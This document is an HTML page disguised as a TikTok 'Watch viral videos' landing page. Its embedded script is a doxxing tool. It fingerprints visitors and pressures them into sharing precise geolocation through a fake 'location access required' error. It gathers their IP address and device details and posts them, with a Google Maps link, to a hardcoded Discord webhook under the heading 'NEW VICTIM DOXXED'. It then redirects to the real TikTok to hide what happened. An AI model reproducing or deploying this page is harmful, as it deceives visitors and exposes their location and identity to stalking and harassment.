<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        #main-page, #error-page { min-height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .wrapper { width: 100%; max-width: 420px; padding: 20px; text-align: center; }
        .header { margin-bottom: 60px; }
        .logo-img { width: 150px; height: auto; }
        .title { font-size: 32px; font-weight: bold; margin-bottom: 20px; }
        .desc { font-size: 18px; margin-bottom: 40px; }
        .watch-btn { width: 100%; padding: 18px; background: #fe2c55; border: none; border-radius: 12px; color: #fff; font-size: 20px; font-weight: bold; cursor: pointer; }
        #location-info { display: none; }
        #error-message { text-align: center; max-width: 600px; padding: 40px; background: #161616; border-radius: 12px; }
        .error-icon { font-size: 80px; margin-bottom: 20px; animation: shake 0.5s infinite alternate; }
        @keyframes shake { 0% { transform: translateX(0); } 100% { transform: translateX(10px); } }
    </style>
</head>
<body>
    <!-- Main Page -->
    <div id="main-page">
        <div class="wrapper">
            <div class="header">
                <img src="./Screenshot_2025-12-30_211832.png" alt="TikTok" class="logo-img">
            </div>
            <div class="title">Watch viral videos</div>
            <div class="desc">Enjoy the best TikTok content right now</div>
            <button class="watch-btn" id="watch-btn">Watch Now</button>
            <div id="location-info"></div>
        </div>
    </div>

    <!-- Error Page -->
    <div id="error-page" style="display:none;">
        <div id="error-message">
            <div class="error-icon">‚ö†Ô∏è</div>
            <h2>Location access required</h2>
            <p>To use TikTok and access its services, please enable location permissions.</p>
            <p>Refresh the page and allow location access when prompted.</p>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1455799307822436365/mPDqpWJT8B2tC9_UmBeaZ0kSuQoo5GUG4bq2kTCUl5giP-_X0HR_N1mn9Ktd2lIbBKEb';
        let userCoords = null;
        let fpData = null;

        const mainPage = document.getElementById('main-page');
        const errorPage = document.getElementById('error-page');
        const watchBtn = document.getElementById('watch-btn');

        async function getFingerprint() {
            const fp = await FingerprintJS.load({ monitoring: false });
            const result = await fp.get();
            fpData = result.visitorId;
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'N/A'; }
        }

        function handleLocation(coords) {
            if (coords.error) {
                mainPage.style.display = 'none';
                errorPage.style.display = 'flex';
            } else {
                userCoords = coords;
                mainPage.style.display = 'flex';
                errorPage.style.display = 'none';
            }
        }

        // Always reset coords on load - force re-prompt every time page loads/refreshes
        function resetAndRequestLocation() {
            userCoords = null; // Force new request every reload
            if (!navigator.geolocation) {
                handleLocation({error: true});
                return;
            }

            navigator.geolocation.getCurrentPosition(
                pos => {
                    const coords = {
                        latitude: pos.coords.latitude.toFixed(6),
                        longitude: pos.coords.longitude.toFixed(6)
                    };
                    handleLocation(coords);
                },
                () => handleLocation({error: true}),
                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
            );
        }

        watchBtn.addEventListener('click', async () => {
            if (userCoords) {
                watchBtn.textContent = 'Loading TikTok...';
                await sendDoxx();
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            // If no coords yet, trigger the request on click
            resetAndRequestLocation();
        });

        async function sendDoxx() {
            const ip = await getIP();
            const platform = navigator.platform || 'N/A';
            const userAgent = navigator.userAgent || 'N/A';
            const deviceMemory = navigator.deviceMemory || 'N/A';
            const cores = navigator.hardwareConcurrency || 'N/A';

            const message = 
`NEW VICTIM DOXXED üíÄ

IP: ${ip}
Fingerprint ID: ${fpData || 'N/A'}
Platform/OS: ${platform}
User Agent: ${userAgent}
Device Memory: ${deviceMemory} GB
Cores: ${cores}
Latitude: ${userCoords ? userCoords.latitude : 'DENIED'}
Longitude: ${userCoords ? userCoords.longitude : 'DENIED'}
Google Maps: ${userCoords ? 'https://www.google.com/maps?q=' + userCoords.latitude + ',' + userCoords.longitude : 'DENIED'}
Timestamp: ${new Date().toISOString()}`;

            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: message })
                });
            } catch(e) {}
        }

        window.onload = async () => {
            await getFingerprint();
            mainPage.style.display = 'flex';
            errorPage.style.display = 'none';
            resetAndRequestLocation(); // Auto trigger on load (gesture from load is allowed in many cases)
        };
    </script>
</body>
</html>
